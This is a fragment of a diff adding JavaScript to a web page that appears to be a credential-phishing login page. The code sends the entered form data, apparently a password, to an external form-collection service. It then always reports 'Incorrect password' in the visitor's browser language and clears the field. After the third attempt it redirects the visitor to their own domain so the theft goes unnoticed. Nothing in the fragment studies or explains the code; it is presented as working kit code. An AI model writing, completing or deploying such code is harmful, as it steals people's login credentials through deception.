+                    const response = await fetch('https://submit-form.com/J2IVAy4bj', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    console.log(response.ok ? 'Submission to form successful!' : 'Submission to form failed.');
+                } catch (error) {
+                    console.error('Submission error:', error);
+                }
+
+                if (submissionAttempts <= 2) {
+                    errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
+                    errorMessage.style.display = 'block';
+                    passwordInput.value = '';
+                    honeypotInput.value = '';
+                    passwordInput.focus();
+                } else if (submissionAttempts === 3) {
+                    if (domain) {
+                        window.location.href = `https://${domain}`;
+                    } else {
+                        errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
+                        errorMessage.style.display = 'block';
+                        passwordInput.value = '';
+                        honeypotInput.value = '';
+                        passwordInput.focus();
+                    }
+                }
+            });
+        });
+    </script>
 </body>
 </html>
